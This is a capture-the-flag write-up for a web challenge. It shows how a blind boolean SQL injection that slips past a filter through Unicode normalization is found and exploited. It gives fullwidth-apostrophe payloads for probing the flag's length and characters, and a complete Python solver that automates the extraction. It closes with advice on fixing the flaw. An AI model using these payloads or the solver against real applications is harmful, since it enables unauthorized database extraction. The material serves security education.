This writeup covers **The Riddler's Hall of Fame 2**, the second version of the same Batman-themed web challenge.

The first challenge leaked SQL errors and allowed direct data extraction with `UNION SELECT`. This version is stricter. It does not show SQL errors, and it does not print query results anywhere.

Instead, it gives only one signal: whether the current identity is verified or unknown.

## First Look

Opening the challenge shows the same dark Batman-themed site, but this time the navbar includes a **V2 — CLASSIFIED** badge.

Register a normal account with any username and password.

![Registration page](./images/riddler2/pic2.png)

After logging in, the app sends you to the riddle page. The answer is:

```text
footsteps
```

After solving the riddle, you land on the Hall of Fame leaderboard.

![Hall of Fame page with verified identity](./images/riddler2/pic44.png)

Your score appears as `1337`, and there is a green badge at the top:

```text
✓ Identity Verified
Your alias was found in the registry.
```

There are no SQL errors, no leaked rows, and no visible query output. That badge is the only thing the app tells us.

## Reading the Register Form

Going back to the register form and reading the hint text gives the same important clue as the first version:

> The system normalizes all aliases to standard format before verification. Ornamental variants like ＯＲ and ＡＮＤ are accepted but treated as standard characters.

![Register form hint about Unicode normalization](./images/riddler2/pic5.png)

The system normalizes Unicode characters before verification. The same trick from the first challenge still applies, but the exploitation method has to change.

In version 1, `UNION SELECT` worked because the app displayed returned data. In version 2, nothing is displayed. The only output is a boolean response:

- `Identity Verified`
- `Identity Unknown`

## Confirming the Injection

To confirm the injection, register with a condition that is always true:

```sql
x＇ OR (1=1)--
```

![Registering a true boolean SQL injection payload](./images/riddler2/pic6.png)

Login, solve the riddle, and visit the Hall of Fame.

![Identity verified when the injected condition is true](./images/riddler2/pic7.png)

The app shows:

```text
✓ Identity Verified
```

Now logout and register with a condition that is always false:

```sql
x＇ OR (1=2)--
```

Login again, solve the riddle, and visit the Hall of Fame.

![Identity unknown when the injected condition is false](./images/riddler2/pic8.png)

This time the app shows:

```text
✗ Identity Unknown
```

True gives **Verified**. False gives **Unknown**.

That confirms the injection, but it also tells us this is a **blind boolean SQL injection**. We cannot directly read data. We can only ask yes/no questions.

## Why UNION Is Useless Here

Trying the version 1 payload does not help:

```sql
x＇ UNION SELECT flag FROM hall_of_fame_secrets--
```

The result is:

```text
✗ Identity Unknown
```

No data is returned, and nothing is displayed on the page. The app is only checking whether a row exists or not, so a direct `UNION SELECT` extraction is useless here.

We need to turn the flag extraction into a series of true/false checks.

## Confirming the Target Table

First, confirm that the same secret table exists.

Register with:

```sql
x＇ OR (SELECT COUNT(*) FROM hall_of_fame_secrets)>0--
```

![Payload checking whether the secret table contains rows](./images/riddler2/pic9.png)

The Hall of Fame returns:

![Identity verified after confirming the secret table exists](./images/riddler2/pic10.png)

```text
✓ Identity Verified
```

The table exists and contains data.

## Finding the Flag Length

The next step is to discover the flag length.

Register with:

```sql
x＇ OR LENGTH((SELECT flag FROM hall_of_fame_secrets LIMIT 1))>10--
```

Then try:

```sql
x＇ OR LENGTH((SELECT flag FROM hall_of_fame_secrets LIMIT 1))>30--
```

Both return verified, so the flag is longer than `10` and longer than `30`.

![Verified response while testing lower flag length bounds](./images/riddler2/pic11.png)

Then test:

```sql
x＇ OR LENGTH((SELECT flag FROM hall_of_fame_secrets LIMIT 1))>50--
```

This returns unknown, so the flag is shorter than `50`.

![Unknown response while testing a too-large flag length](./images/riddler2/pic12.png)

Keep narrowing the length until this condition returns verified:

```sql
x＇ OR LENGTH((SELECT flag FROM hall_of_fame_secrets LIMIT 1))=49--
```

The flag is `49` characters long.

## Extracting Characters Manually

Now that the length is known, the flag can be extracted one character at a time.

For the first character:

```sql
x＇ OR SUBSTRING((SELECT flag FROM hall_of_fame_secrets LIMIT 1),1,1)='s'--
```

This returns verified, so the first character is `s`.

For the second character:

```sql
x＇ OR SUBSTRING((SELECT flag FROM hall_of_fame_secrets LIMIT 1),2,1)='e'--
```

This also returns verified, so the second character is `e`.

At this point the method is clear, but doing it manually would be painful. For a 49-character flag, even a small charset can require hundreds or thousands of requests.

So the better approach is to script it.

## Writing the Solver

The solver repeats the same process for every character position:

- Register a new account with a boolean SQL payload.
- Login with that account.
- Solve the riddle automatically.
- Visit `/hall-of-fame`.
- Check if `Identity Verified` appears in the response.
- If it does, the condition is true and the tested character is correct.
- Move to the next position.

Install the dependency and run the script:

```bash
pip install requests
python3 solve.py
```

Here is the solver:

```python
import requests
import string
import time

# Config
BASE_URL = "http://172.27.0.3:5000/"
PASSWORD = "solverpass123"
CHARSET = string.ascii_lowercase + string.digits + string.punctuation + "_-{}"
RIDDLE_A = "footsteps"

FF_APOS = "＇"
FF_DASH = "－"
FF_DASH2 = "－－"

session = requests.Session()

def register(username):
    r = session.post(
        f"{BASE_URL}/register",
        data={"username": username, "password": PASSWORD},
        allow_redirects=True,
    )
    return "Account created" in r.text or "Login" in r.url

def login(username):
    r = session.post(
        f"{BASE_URL}/login",
        data={"username": username, "password": PASSWORD},
        allow_redirects=True,
    )
    return "riddle" in r.url or "hall" in r.url

def solve_riddle():
    r = session.post(
        f"{BASE_URL}/riddle",
        data={"answer": RIDDLE_A},
        allow_redirects=True,
    )
    return "hall" in r.url or "Correct" in r.text

def check_verified():
    r = session.get(f"{BASE_URL}/hall-of-fame", allow_redirects=True)
    return "Identity Verified" in r.text

def logout():
    session.get(f"{BASE_URL}/logout")

def probe(condition):
    payload = f"x{FF_APOS} OR ({condition}){FF_DASH}{FF_DASH} "
    logout()
    register(payload)
    login(payload)
    solve_riddle()
    return check_verified()

def get_flag_length():
    for length in range(1, 100):
        if probe(f"LENGTH((SELECT flag FROM hall_of_fame_secrets LIMIT 1))={length}"):
            return length
    return 0

def get_flag(length):
    flag = ""
    for i in range(1, length + 1):
        for char in CHARSET:
            if char == "'":
                continue
            if probe(f"SUBSTRING((SELECT flag FROM hall_of_fame_secrets LIMIT 1),{i},1)='{char}'"):
                flag += char
                print(f"[+] Position {i:02d}: {char}  →  {flag}")
                break
        time.sleep(0.1)
    return flag

length = get_flag_length()
flag = get_flag(length)
print(f"\nFLAG: {flag}")
```

After running it, the script extracts the flag character by character.

![Solver extracting the flag character by character](./images/riddler2/pic133.png)

Example output:

```text
[+] Position 01: s  →  s
[+] Position 02: e  →  se
[+] Position 03: c  →  sec
...
FLAG: securinetsisgt{bl1nd_b00l34n_1s_th3_tr43_3n1gm4}
```

## Final Thoughts

This second version removes the easy path from the first challenge. There are no SQL errors and no visible query results.

But the bug is still there: the app accepts Unicode ornamental characters, stores the alias, normalizes it later, and then uses the normalized value in a SQL condition.

The difference is that exploitation becomes blind. Instead of dumping data directly, every piece of information has to be converted into a yes/no question.

The fix is the same core lesson:

- normalize before validation and storage,
- use parameterized SQL queries,
- avoid building SQL strings from user-controlled values,
- avoid exposing verification behavior that can be abused as an oracle.
